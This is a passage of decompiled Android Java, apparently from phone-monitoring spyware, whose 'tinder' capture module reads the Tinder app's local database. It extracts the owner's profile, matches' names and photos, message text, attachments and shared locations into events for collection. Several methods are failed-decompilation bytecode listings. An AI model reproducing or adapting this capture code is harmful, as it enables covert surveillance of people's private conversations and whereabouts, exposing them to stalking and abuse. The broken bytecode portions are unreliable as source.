    //   141: astore 10
    //   143: aload 8
    //   145: ifnull +10 -> 155
    //   148: aload 8
    //   150: invokeinterface 85 1 0
    //   155: aload 14
    //   157: ifnull +8 -> 165
    //   160: aload 14
    //   162: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   165: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   168: istore 7
    //   170: iload 7
    //   172: ifeq +3 -> 175
    //   175: aload 10
    //   177: areturn
    //   178: ldc_w 379
    //   181: astore 14
    //   183: ldc_w 381
    //   186: astore 15
    //   188: aload 14
    //   190: aload 15
    //   192: invokestatic 384	com/vvt/capture/tinder/a/a:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   195: astore 14
    //   197: goto -141 -> 56
    //   200: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   203: istore 20
    //   205: iload 20
    //   207: ifeq +3 -> 210
    //   210: ldc2_w 385
    //   213: lstore 21
    //   215: lload 21
    //   217: invokestatic 393	android/os/SystemClock:sleep	(J)V
    //   220: invokestatic 374	com/vvt/capture/tinder/removeFromPath:removeFromPath	()Ljava/lang/String;
    //   223: astore 15
    //   225: iconst_2
    //   226: istore 16
    //   228: iload 16
    //   230: anewarray 105	java/lang/String
    //   233: astore 17
    //   235: iconst_0
    //   236: istore 18
    //   238: aload 17
    //   240: iconst_0
    //   241: aload 11
    //   243: aastore
    //   244: iconst_1
    //   245: istore 19
    //   247: aload 17
    //   249: iload 19
    //   251: aload 12
    //   253: aastore
    //   254: aload 14
    //   256: aload 15
    //   258: aload 17
    //   260: invokevirtual 94	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   263: astore 8
    //   265: aload 8
    //   267: ifnull -124 -> 143
    //   270: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   273: istore 19
    //   275: iload 19
    //   277: ifeq +3 -> 280
    //   280: aload 14
    //   282: aload_0
    //   283: aload 8
    //   285: aload 6
    //   287: invokestatic 377	com/vvt/capture/tinder/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Landroid/database/Cursor;Lcom/vvt/base/removeFromPath;)Ljava/util/ArrayList;
    //   290: astore 10
    //   292: goto -149 -> 143
    //   295: astore 14
    //   297: iconst_0
    //   298: istore 13
    //   300: aconst_null
    //   301: astore 14
    //   303: getstatic 28	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	Z
    //   306: istore 19
    //   308: iload 19
    //   310: ifeq +3 -> 313
    //   313: aload 8
    //   315: ifnull +10 -> 325
    //   318: aload 8
    //   320: invokeinterface 85 1 0
    //   325: aload 14
    //   327: ifnull -162 -> 165
    //   330: goto -170 -> 160
    //   333: astore 10
    //   335: iconst_0
    //   336: istore 13
    //   338: aconst_null
    //   339: astore 14
    //   341: aload 8
    //   343: ifnull +10 -> 353
    //   346: aload 8
    //   348: invokeinterface 85 1 0
    //   353: aload 14
    //   355: ifnull +8 -> 363
    //   358: aload 14
    //   360: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   363: aload 10
    //   365: athrow
    //   366: astore 10
    //   368: goto -27 -> 341
    //   371: astore 11
    //   373: goto -70 -> 303
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	376	0	paramString1	String
    //   0	376	1	paramString2	String
    //   0	376	2	paramLong1	long
    //   0	376	4	paramLong2	long
    //   0	376	6	paramb	com.vvt.base.removeFromPath
    //   1	170	7	bool1	boolean
    //   4	343	8	localCursor	Cursor
    //   9	3	9	bool2	boolean
    //   19	272	10	localArrayList	ArrayList
    //   333	31	10	localObject1	Object
    //   366	1	10	localObject2	Object
    //   30	212	11	str1	String
    //   371	1	11	localException1	Exception
    //   37	215	12	str2	String
    //   43	294	13	bool3	boolean
    //   54	227	14	localObject3	Object
    //   295	1	14	localException2	Exception
    //   301	58	14	localObject4	Object
    //   64	193	15	str3	String
    //   69	3	16	bool4	boolean
    //   77	152	16	i	int
    //   84	175	17	arrayOfString	String[]
    //   87	150	18	j	int
    //   124	185	19	bool5	boolean
    //   203	3	20	bool6	boolean
    //   213	3	21	l	long
    // Exception table:
    //   from	to	target	type
    //   39	43	295	java/lang/Exception
    //   50	54	295	java/lang/Exception
    //   190	195	295	java/lang/Exception
    //   39	43	333	finally
    //   50	54	333	finally
    //   190	195	333	finally
    //   61	64	366	finally
    //   66	69	366	finally
    //   79	84	366	finally
    //   92	95	366	finally
    //   102	105	366	finally
    //   109	114	366	finally
    //   121	124	366	finally
    //   136	141	366	finally
    //   200	203	366	finally
    //   215	220	366	finally
    //   220	223	366	finally
    //   228	233	366	finally
    //   241	244	366	finally
    //   251	254	366	finally
    //   258	263	366	finally
    //   270	273	366	finally
    //   285	290	366	finally
    //   303	306	366	finally
    //   61	64	371	java/lang/Exception
    //   66	69	371	java/lang/Exception
    //   79	84	371	java/lang/Exception
    //   92	95	371	java/lang/Exception
    //   102	105	371	java/lang/Exception
    //   109	114	371	java/lang/Exception
    //   121	124	371	java/lang/Exception
    //   136	141	371	java/lang/Exception
    //   200	203	371	java/lang/Exception
    //   215	220	371	java/lang/Exception
    //   220	223	371	java/lang/Exception
    //   228	233	371	java/lang/Exception
    //   241	244	371	java/lang/Exception
    //   251	254	371	java/lang/Exception
    //   258	263	371	java/lang/Exception
    //   270	273	371	java/lang/Exception
    //   285	290	371	java/lang/Exception
  }
  
  public static List a(TinderData paramTinderData)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramTinderData.b();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.TINDER.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramTinderData.f().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramTinderData.f().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramTinderData.f().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramTinderData.f().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramTinderData.f().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramTinderData.i().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramTinderData.i().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramTinderData.i().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramTinderData.i().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramTinderData.i().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramTinderData.b();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.TINDER.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramTinderData.f().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramTinderData.e();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    Object localObject6;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramTinderData.f().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (bool4)
      {
        bool1 = b;
        if (!bool1) {}
      }
      else
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramTinderData.e();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramTinderData.f().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (bool5)
      {
        bool1 = b;
        if (!bool1) {}
      }
      else
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramTinderData.b();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.TINDER.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramTinderData.f().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramTinderData.j();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramTinderData.a();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      float f = paramTinderData.g().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d = paramTinderData.g().a();
      ((com.vvt.events.e)localObject1).a(d);
      d = paramTinderData.g().b();
      ((com.vvt.events.e)localObject1).b(d);
      localObject2 = paramTinderData.g().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject2 = paramTinderData.i().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramTinderData.d();
    localObject5 = TinderData.Direction.IN;
    if (localObject2 == localObject5) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramTinderData.b();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.TINDER.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramTinderData.c();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      localObject2 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject2).<init>();
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramTinderData.a();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramTinderData.d();
      localObject2 = TinderData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramTinderData.h().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  private static String b()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("msgTable.user_id");
    localStringBuilder.append(" as user_id");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.match_id");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.created");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.text");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.viewed");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.is_liked");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.message_id");
    localStringBuilder.append(" , ");
    localStringBuilder.append("msgTable.type");
    localStringBuilder.append(" , ");
    localStringBuilder.append("usersTable.first_name");
    localStringBuilder.append(" , ");
    localStringBuilder.append("photosTable.id");
    localStringBuilder.append(" , ");
    localStringBuilder.append("photosTable.image_url");
    localStringBuilder.append(" , ");
    localStringBuilder.append("photosTable.photo_order");
    localStringBuilder.append(" , ");
    localStringBuilder.append("matchesTable.id");
    localStringBuilder.append(" , ");
    localStringBuilder.append("matchesTable.user_id");
    localStringBuilder.append(" as participant_id");
    localStringBuilder.append(" , ");
    localStringBuilder.append("matchesTable.user_name");
    localStringBuilder.append(" as participant_name");
    localStringBuilder.append(" , ");
    localStringBuilder.append("matchesTable.superliker");
    localStringBuilder.append(" , ");
    localStringBuilder.append("matchesTable.my_group_id");
    localStringBuilder.append(" , ");
    localStringBuilder.append("matchesTable.their_group_id");
    localStringBuilder.append(" FROM ");
    localStringBuilder.append("messages");
    localStringBuilder.append(" as msgTable");
    localStringBuilder.append(" LEFT JOIN ");
    localStringBuilder.append("users");
    localStringBuilder.append(" as usersTable");
    localStringBuilder.append(" ON ");
    localStringBuilder.append("msgTable.user_id");
    localStringBuilder.append(" = ");
    localStringBuilder.append("usersTable.id");
    localStringBuilder.append(" LEFT JOIN ");
    localStringBuilder.append("photos");
    localStringBuilder.append(" as photosTable");
    localStringBuilder.append(" ON ");
    localStringBuilder.append("msgTable.user_id");
    localStringBuilder.append(" = ");
    localStringBuilder.append("photosTable.user_id");
    localStringBuilder.append(" AND ");
    localStringBuilder.append("photosTable.photo_order");
    localStringBuilder.append(" = 0 ");
    localStringBuilder.append(" LEFT JOIN ");
    localStringBuilder.append("matches");
    localStringBuilder.append(" as matchesTable");
    localStringBuilder.append(" ON ");
    localStringBuilder.append("msgTable.match_id");
    localStringBuilder.append(" = ");
    localStringBuilder.append("matchesTable.id");
    localStringBuilder.append(" WHERE msgTable.created > ?");
    localStringBuilder.append(" AND msgTable.created <= ?");
    localStringBuilder.append(" ORDER BY msgTable.created DESC");
    return localStringBuilder.toString();
  }
  
  private static String b(SQLiteDatabase paramSQLiteDatabase, Cursor paramCursor, String paramString)
  {
    int i = 1;
    Object localObject1 = "";
    Object localObject2 = new String[3];
    localObject2[0] = "user_id";
    localObject2[i] = "match_id";
    int j = 2;
    localObject2[j] = "is_my_group";
    Object localObject3 = "match_id = ?  AND is_my_group = 0";
    String[] arrayOfString = new String[i];
    arrayOfString[0] = paramString;
    Object localObject4 = "match_participant";
    Object localObject5 = paramSQLiteDatabase;
    localObject2 = paramSQLiteDatabase.query((String)localObject4, (String[])localObject2, (String)localObject3, arrayOfString, null, null, null);
    if (localObject2 != null)
    {
      boolean bool1 = ((Cursor)localObject2).moveToFirst();
      if (!bool1) {}
    }
    for (localObject4 = localObject1;; localObject4 = localObject5)
    {
      int k = ((Cursor)localObject2).getColumnIndex("user_id");
      localObject5 = ((Cursor)localObject2).getString(k);
      localObject5 = a(paramSQLiteDatabase, (String)localObject5);
      boolean bool3 = com.vvt.ag.b.a((String)localObject4);
      if (bool3) {}
      for (;;)
      {
        boolean bool4 = ((Cursor)localObject2).moveToNext();
        if (bool4) {
          break;
        }
        localObject1 = localObject5;
        boolean bool2 = b;
        if (bool2) {}
        return (String)localObject1;
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        localObject4 = ((StringBuilder)localObject3).append((String)localObject4);
        localObject3 = " + ";
        localObject4 = ((StringBuilder)localObject4).append((String)localObject3);
        localObject5 = (String)localObject5;
      }
    }
  }
  
  /* Error */
  private static String b(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   7: istore 4
    //   9: iload 4
    //   11: ifeq +3 -> 14
    //   14: invokestatic 709	com/vvt/capture/tinder/removeFromPath:d	()Ljava/lang/String;
    //   17: astore 5
    //   19: iconst_2
    //   20: istore 6
    //   22: iload 6
    //   24: anewarray 105	java/lang/String
    //   27: astore 7
    //   29: iconst_0
    //   30: istore 8
    //   32: aconst_null
    //   33: astore 9
    //   35: aload 7
    //   37: iconst_0
    //   38: aload_1
    //   39: aastore
    //   40: iconst_1
    //   41: istore 8
    //   43: aconst_null
    //   44: astore 10
    //   46: iconst_0
    //   47: invokestatic 108	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   50: astore 10
    //   52: aload 7
    //   54: iload 8
    //   56: aload 10
    //   58: aastore
    //   59: aload_0
    //   60: aload 5
    //   62: aload 7
    //   64: invokevirtual 94	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   67: astore 7
    //   69: aload 7
    //   71: ifnull +196 -> 267
    //   74: aload 7
    //   76: invokeinterface 97 1 0
    //   81: istore 4
    //   83: iload 4
    //   85: ifeq +182 -> 267
    //   88: ldc_w 711
    //   91: astore 5
    //   93: aload 7
    //   95: aload 5
    //   97: invokeinterface 77 2 0
    //   102: istore 4
    //   104: aload 7
    //   106: iload 4
    //   108: invokeinterface 80 2 0
    //   113: astore 5
    //   115: ldc 111
    //   117: astore 9
    //   119: aload 7
    //   121: aload 9
    //   123: invokeinterface 77 2 0
    //   128: istore 8
    //   130: aload 7
    //   132: iload 8
    //   134: invokeinterface 80 2 0
    //   139: astore_3
    //   140: aload 7
    //   142: ifnull +10 -> 152
    //   145: aload 7
    //   147: invokeinterface 85 1 0
    //   152: aload 5
    //   154: invokestatic 40	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   157: istore 6
    //   159: iload 6
    //   161: ifeq +10 -> 171
    //   164: aload_0
    //   165: aload_3
    //   166: invokestatic 713	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   169: astore 5
    //   171: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   174: istore_2
    //   175: iload_2
    //   176: ifeq +3 -> 179
    //   179: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   182: istore_2
    //   183: iload_2
    //   184: ifeq +3 -> 187
    //   187: aload 5
    //   189: areturn
    //   190: astore 5
    //   192: iconst_0
    //   193: istore 6
    //   195: aconst_null
    //   196: astore 7
    //   198: iconst_0
    //   199: istore 4
    //   201: aconst_null
    //   202: astore 5
    //   204: getstatic 28	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	Z
    //   207: istore 8
    //   209: iload 8
    //   211: ifeq +3 -> 214
    //   214: aload 7
    //   216: ifnull -64 -> 152
    //   219: goto -74 -> 145
    //   222: astore 5
    //   224: iconst_0
    //   225: istore 6
    //   227: aconst_null
    //   228: astore 7
    //   230: aload 5
    //   232: astore_3
    //   233: aload 7
    //   235: ifnull +10 -> 245
    //   238: aload 7
    //   240: invokeinterface 85 1 0
    //   245: aload_3
    //   246: athrow
    //   247: astore_3
    //   248: goto -15 -> 233
    //   251: astore 5
    //   253: iconst_0
    //   254: istore 4
    //   256: aconst_null
    //   257: astore 5
    //   259: goto -55 -> 204
    //   262: astore 9
    //   264: goto -60 -> 204
    //   267: iconst_0
    //   268: istore 4
    //   270: aconst_null
    //   271: astore 5
    //   273: goto -133 -> 140
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	276	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	276	1	paramString	String
    //   1	183	2	bool1	boolean
    //   3	243	3	localObject1	Object
    //   247	1	3	localObject2	Object
    //   7	77	4	bool2	boolean
    //   102	167	4	i	int
    //   17	171	5	str1	String
    //   190	1	5	localException1	Exception
    //   202	1	5	localObject3	Object
    //   222	9	5	localObject4	Object
    //   251	1	5	localException2	Exception
    //   257	15	5	localObject5	Object
    //   20	3	6	j	int
    //   157	69	6	bool3	boolean
    //   27	212	7	localObject6	Object
    //   30	103	8	k	int
    //   207	3	8	bool4	boolean
    //   33	89	9	str2	String
    //   262	1	9	localException3	Exception
    //   44	13	10	str3	String
    // Exception table:
    //   from	to	target	type
    //   14	17	190	java/lang/Exception
    //   22	27	190	java/lang/Exception
    //   38	40	190	java/lang/Exception
    //   46	50	190	java/lang/Exception
    //   56	59	190	java/lang/Exception
    //   62	67	190	java/lang/Exception
    //   14	17	222	finally
    //   22	27	222	finally
    //   38	40	222	finally
    //   46	50	222	finally
    //   56	59	222	finally
    //   62	67	222	finally
    //   74	81	247	finally
    //   95	102	247	finally
    //   106	113	247	finally
    //   121	128	247	finally
    //   132	139	247	finally
    //   204	207	247	finally
    //   74	81	251	java/lang/Exception
    //   95	102	251	java/lang/Exception
    //   106	113	251	java/lang/Exception
    //   121	128	262	java/lang/Exception
    //   132	139	262	java/lang/Exception
  }
  
  /* Error */
  private static byte[] b(String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   7: istore_3
    //   8: iload_3
    //   9: ifeq +3 -> 12
    //   12: iconst_0
    //   13: newarray <illegal type>
    //   15: astore 4
    //   17: new 715	org/apache/http/impl/client/DefaultHttpClient
    //   20: astore 5
    //   22: aload 5
    //   24: invokespecial 716	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   27: new 718	org/apache/http/client/methods/HttpGet
    //   30: astore 6
    //   32: aload 6
    //   34: aload_0
    //   35: invokespecial 719	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   38: iconst_0
    //   39: istore_1
    //   40: aconst_null
    //   41: astore_2
    //   42: new 721	java/io/ByteArrayOutputStream
    //   45: astore 7
    //   47: aload 7
    //   49: invokespecial 722	java/io/ByteArrayOutputStream:<init>	()V
    //   52: aload 5
    //   54: aload 6
    //   56: invokevirtual 726	org/apache/http/impl/client/DefaultHttpClient:execute	(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    //   59: astore 5
    //   61: aload 5
    //   63: invokeinterface 732 1 0
    //   68: astore 5
    //   70: aload 5
    //   72: invokeinterface 738 1 0
    //   77: astore_2
    //   78: sipush 2048
    //   81: istore 8
    //   83: iload 8
    //   85: newarray <illegal type>
    //   87: astore 5
    //   89: aload_2
    //   90: aload 5
    //   92: invokevirtual 745	java/io/InputStream:read	([B)I
    //   95: istore 9
    //   97: iconst_m1
    //   98: istore 10
    //   100: iload 9
    //   102: iload 10
    //   104: if_icmpeq +51 -> 155
    //   107: iconst_0
    //   108: istore 10
    //   110: aload 7
    //   112: aload 5
    //   114: iconst_0
    //   115: iload 9
    //   117: invokevirtual 749	java/io/ByteArrayOutputStream:write	([BII)V
    //   120: goto -31 -> 89
    //   123: astore 5
    //   125: getstatic 28	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	Z
    //   128: istore 8
    //   130: iload 8
    //   132: ifeq +3 -> 135
    //   135: aload_2
    //   136: invokestatic 752	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   139: aload 7
    //   141: invokestatic 755	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   144: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   147: istore_1
    //   148: iload_1
    //   149: ifeq +3 -> 152
    //   152: aload 4
    //   154: areturn
    //   155: aload 7
    //   157: invokevirtual 758	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   160: astore 4
    //   162: aload_2
    //   163: invokestatic 752	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   166: goto -27 -> 139
    //   169: astore 4
    //   171: aload_2
    //   172: invokestatic 752	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   175: aload 7
    //   177: invokestatic 755	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   180: aload 4
    //   182: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	183	0	paramString	String
    //   1	148	1	bool1	boolean
    //   3	169	2	localInputStream	java.io.InputStream
    //   7	2	3	bool2	boolean
    //   15	146	4	arrayOfByte	byte[]
    //   169	12	4	localObject1	Object
    //   20	93	5	localObject2	Object
    //   123	1	5	localException	Exception
    //   30	25	6	localHttpGet	org.apache.http.client.methods.HttpGet
    //   45	131	7	localByteArrayOutputStream	java.io.ByteArrayOutputStream
    //   81	3	8	i	int
    //   128	3	8	bool3	boolean
    //   95	21	9	j	int
    //   98	11	10	k	int
    // Exception table:
    //   from	to	target	type
    //   54	59	123	java/lang/Exception
    //   61	68	123	java/lang/Exception
    //   70	77	123	java/lang/Exception
    //   83	87	123	java/lang/Exception
    //   90	95	123	java/lang/Exception
    //   115	120	123	java/lang/Exception
    //   155	160	123	java/lang/Exception
    //   54	59	169	finally
    //   61	68	169	finally
    //   70	77	169	finally
    //   83	87	169	finally
    //   90	95	169	finally
    //   115	120	169	finally
    //   125	128	169	finally
    //   155	160	169	finally
  }
  
  private static long c(String paramString)
  {
    Object localObject = new java/text/SimpleDateFormat;
    String str = "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'";
    ((SimpleDateFormat)localObject).<init>(str);
    long l = 0L;
    try
    {
      localObject = ((SimpleDateFormat)localObject).parse(paramString);
      l = ((Date)localObject).getTime();
    }
    catch (ParseException localParseException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
    return l;
  }
  
  private static String c()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "created";
    arrayOfObject[1] = "messages";
    arrayOfObject[2] = "created";
    return String.format("SELECT %s FROM %s  ORDER BY %s DESC LIMIT 1", arrayOfObject);
  }
  
  /* Error */
  private static String c(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: new 335	java/lang/StringBuilder
    //   13: astore 4
    //   15: aload 4
    //   17: invokespecial 336	java/lang/StringBuilder:<init>	()V
    //   20: aload 4
    //   22: ldc_w 774
    //   25: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   28: pop
    //   29: aload 4
    //   31: ldc 111
    //   33: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   36: pop
    //   37: aload 4
    //   39: ldc_w 628
    //   42: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   45: pop
    //   46: aload 4
    //   48: ldc_w 711
    //   51: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   54: pop
    //   55: aload 4
    //   57: ldc_w 668
    //   60: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   63: pop
    //   64: aload 4
    //   66: ldc_w 776
    //   69: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   72: pop
    //   73: aload 4
    //   75: ldc_w 778
    //   78: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   81: pop
    //   82: aload 4
    //   84: ldc 111
    //   86: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   89: pop
    //   90: aload 4
    //   92: ldc_w 780
